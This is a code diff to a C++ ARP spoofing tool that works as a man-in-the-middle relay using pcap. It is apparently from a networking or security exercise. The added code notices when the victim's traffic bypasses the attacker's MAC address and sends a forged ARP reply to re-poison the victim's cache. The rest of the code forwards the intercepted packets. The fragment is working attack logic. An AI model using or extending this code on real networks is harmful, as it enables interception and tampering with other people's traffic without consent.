@@ -215,7 +215,26 @@ int main(int argc, char* argv[]) {
                 // [1] sender → target
                 if (ip->sip() == conn.sender_ip &&
                     ip->dip() == conn.target_ip) {
+        
                     EthHdr* eth_hdr = (EthHdr*)packet;
+        
+                    // 🔥 감염이 풀렸는지 확인
+                    if (eth_hdr->dmac_ == conn.target_mac) {
+                        std::cout << "[!] Infection lost (sender → target MAC direct): "
+                                  << std::string(conn.sender_ip) << " → "
+                                  << std::string(conn.target_ip) << std::endl;
+        
+                        EthArpPacket reinfect = make_arp_packet(
+                            Mac(attacker_mac), conn.sender_mac,
+                            Mac(attacker_mac), conn.sender_mac,
+                            conn.target_ip, conn.sender_ip,
+                            false
+                        );
+                        bool ok = send_arp_packet(handle, reinfect);
+                        std::cout << (ok ? "[*] Re-infection sent.\n" : "[!] Re-infection failed!\n");
+                    }
+        
+                    // relay
                     eth_hdr->smac_ = Mac(attacker_mac);
                     eth_hdr->dmac_ = conn.target_mac;
                     pcap_sendpacket(handle, packet, header->caplen);
@@ -236,11 +255,11 @@ int main(int argc, char* argv[]) {
                          ip->dip() != Ip(attacker_ip)) {
                     EthHdr* eth_hdr = (EthHdr*)packet;
                     eth_hdr->smac_ = Mac(attacker_mac);
-                    eth_hdr->dmac_ = conn.target_mac;  // 게이트웨이에게 보냄
+                    eth_hdr->dmac_ = conn.target_mac;
                     pcap_sendpacket(handle, packet, header->caplen);
                 }
         
-                // ✅ [4] 외부 → sender (이게 없으면 응답 안 보임!!)
+                // [4] 외부 → sender
                 else if (ip->dip() == conn.sender_ip &&
                          ip->sip() != conn.target_ip) {
                     EthHdr* eth_hdr = (EthHdr*)packet;
@@ -250,6 +269,7 @@ int main(int argc, char* argv[]) {
                 }
             }
         }
+
 
 
         else if (ntohs(eth->type_) == EthHdr::Arp) {
